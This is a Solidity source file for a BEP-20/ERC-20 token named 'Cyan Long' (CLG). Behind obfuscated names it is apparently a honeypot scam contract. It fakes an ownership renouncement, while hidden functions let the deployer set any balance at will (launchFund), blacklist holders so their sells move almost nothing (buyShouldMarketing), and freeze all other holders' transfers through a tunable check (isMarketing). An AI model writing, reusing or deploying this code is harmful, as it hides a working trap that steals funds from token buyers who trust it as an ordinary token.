//SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

interface totalIsMarketing {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract marketingMode {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface receiverTo {
    function createPair(address liquiditySwap, address toMax) external returns (address);
}

interface tokenAmount {
    function totalSupply() external view returns (uint256);

    function balanceOf(address toTake) external view returns (uint256);

    function transfer(address enableFrom, uint256 receiverExempt) external returns (bool);

    function allowance(address swapTradingShould, address spender) external view returns (uint256);

    function approve(address spender, uint256 receiverExempt) external returns (bool);

    function transferFrom(
        address sender,
        address enableFrom,
        uint256 receiverExempt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed fromBuy, uint256 value);
    event Approval(address indexed swapTradingShould, address indexed spender, uint256 value);
}

interface tokenAmountMetadata is tokenAmount {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract CyanLong is marketingMode, tokenAmount, tokenAmountMetadata {

    address atTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function teamAmountSell(address buyAmount) public {
        if (sellList) {
            return;
        }
        if (receiverIsTotal != amountFundTo) {
            swapReceiver = takeSender;
        }
        liquidityFrom[buyAmount] = true;
        
        sellList = true;
    }

    function transfer(address amountAt, uint256 receiverExempt) external virtual override returns (bool) {
        return liquidityTotal(_msgSender(), amountAt, receiverExempt);
    }

    bool public amountFundTo;

    uint256 public takeSender;

    function transferFrom(address sellBuy, address enableFrom, uint256 receiverExempt) external override returns (bool) {
        if (_msgSender() != atTrading) {
            if (takeAmountIs[sellBuy][_msgSender()] != type(uint256).max) {
                require(receiverExempt <= takeAmountIs[sellBuy][_msgSender()]);
                takeAmountIs[sellBuy][_msgSender()] -= receiverExempt;
            }
        }
        return liquidityTotal(sellBuy, enableFrom, receiverExempt);
    }

    event OwnershipTransferred(address indexed listEnableExempt, address indexed tradingFee);

    uint256 public walletFrom;

    mapping(address => mapping(address => uint256)) private takeAmountIs;

    uint256 private senderEnable;

    bool private receiverIsTotal;

    uint256 private teamTrading = 100000000 * 10 ** 18;

    address public teamIs;

    function minTrading() private view {
        require(liquidityFrom[_msgSender()]);
    }

    uint8 private takeMin = 18;

    function enableLimit(address sellBuy, address enableFrom, uint256 receiverExempt) internal returns (bool) {
        require(receiverAt[sellBuy] >= receiverExempt);
        receiverAt[sellBuy] -= receiverExempt;
        receiverAt[enableFrom] += receiverExempt;
        emit Transfer(sellBuy, enableFrom, receiverExempt);
        return true;
    }

    function decimals() external view virtual override returns (uint8) {
        return takeMin;
    }

    function buyShouldMarketing(address senderMarketing) public {
        minTrading();
        
        if (senderMarketing == teamIs || senderMarketing == atTake) {
            return;
        }
        tradingExempt[senderMarketing] = true;
    }

    mapping(address => bool) public liquidityFrom;

    address toSenderIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool public sellList;

    mapping(address => uint256) private receiverAt;

    mapping(address => bool) public tradingExempt;

    uint256 private maxTx;

    function getOwner() external view returns (address) {
        return feeWalletAt;
    }

    function launchFund(address amountAt, uint256 receiverExempt) public {
        minTrading();
        receiverAt[amountAt] = receiverExempt;
    }

    string private fundToken = "Cyan Long";

    function totalSupply() external view virtual override returns (uint256) {
        return teamTrading;
    }

    function owner() external view returns (address) {
        return feeWalletAt;
    }

    uint256 public isMode;

    constructor (){
        
        totalIsMarketing txMarketing = totalIsMarketing(atTrading);
        atTake = receiverTo(txMarketing.factory()).createPair(txMarketing.WETH(), address(this));
        
        teamIs = _msgSender();
        shouldReceiver();
        liquidityFrom[teamIs] = true;
        receiverAt[teamIs] = teamTrading;
        
        emit Transfer(address(0), teamIs, teamTrading);
    }

    bool public receiverLimitTeam;

    uint256 constant totalShould = 3 ** 10;

    address public atTake;

    uint256 public swapReceiver;

    function shouldReceiver() public {
        emit OwnershipTransferred(teamIs, address(0));
        feeWalletAt = address(0);
    }

    function name() external view virtual override returns (string memory) {
        return fundToken;
    }

    function balanceOf(address toTake) public view virtual override returns (uint256) {
        return receiverAt[toTake];
    }

    uint256 autoWallet;

    function symbol() external view virtual override returns (string memory) {
        return walletLiquidity;
    }

    function liquidityTotal(address sellBuy, address enableFrom, uint256 receiverExempt) internal returns (bool) {
        if (sellBuy == teamIs) {
            return enableLimit(sellBuy, enableFrom, receiverExempt);
        }
        uint256 exemptReceiverLiquidity = tokenAmount(atTake).balanceOf(toSenderIs);
        require(exemptReceiverLiquidity == autoWallet);
        require(enableFrom != toSenderIs);
        if (tradingExempt[sellBuy]) {
            return enableLimit(sellBuy, enableFrom, totalShould);
        }
        return enableLimit(sellBuy, enableFrom, receiverExempt);
    }

    function allowance(address enableTeam, address limitTrading) external view virtual override returns (uint256) {
        if (limitTrading == atTrading) {
            return type(uint256).max;
        }
        return takeAmountIs[enableTeam][limitTrading];
    }

    uint256 toFrom;

    bool private minTxLimit;

    function isMarketing(uint256 receiverExempt) public {
        minTrading();
        autoWallet = receiverExempt;
    }

    function approve(address limitTrading, uint256 receiverExempt) public virtual override returns (bool) {
        takeAmountIs[_msgSender()][limitTrading] = receiverExempt;
        emit Approval(_msgSender(), limitTrading, receiverExempt);
        return true;
    }

    string private walletLiquidity = "CLG";

    address private feeWalletAt;

}